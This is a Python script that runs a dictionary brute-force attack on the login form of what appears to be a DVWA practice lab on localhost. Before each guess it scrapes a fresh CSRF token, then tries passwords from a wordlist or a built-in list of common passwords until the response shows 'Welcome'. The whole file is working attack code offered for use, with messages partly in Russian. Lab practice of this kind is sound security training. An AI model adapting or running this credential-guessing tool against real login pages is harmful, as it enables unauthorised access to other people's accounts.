import requests
from bs4 import BeautifulSoup

URL = "http://localhost:8082/vulnerabilities/brute/"
USERNAME = "admin"

session = requests.Session()


def try_password(password):
    r = session.get(URL)
    soup = BeautifulSoup(r.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    token = token_input["value"] if token_input else ""

    params = {
        "username": USERNAME,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }

    resp = session.get(URL, params=params)

    return "Welcome" in resp.text


def main():
    print("Bruteforce attack")
    print(f"{URL}")

    try:
        with open("words.txt", "r", encoding="utf-8") as f:
            pwds = [p.strip() for p in f if p.strip()]
        print(f"количество паролей {len(pwds)}")
    except FileNotFoundError:
        print("Список не найден, используется список по умолчанию")
        pwds = [
            "password",
            "123456",
            "12345678",
            "qwerty",
            "abc123",
            "monkey",
            "letmein",
            "admin",
            "password1",
            "1234",
            "12345",
            "123456789",
            "football",
            "1234567",
            "hello",
            "welcome",
            "master",
            "login",
            "passw0rd",
            "123123",
        ]

    found = False

    for i, pwd in enumerate(pwds, 1):
        print(f"{i} из {len(pwds)}: {pwd}")

        if try_password(pwd):
            print(f"\nПароль найден: {pwd}")
            found = True
            break

    if not found:
        print("Пароль не найден")


if __name__ == "__main__":
    main()
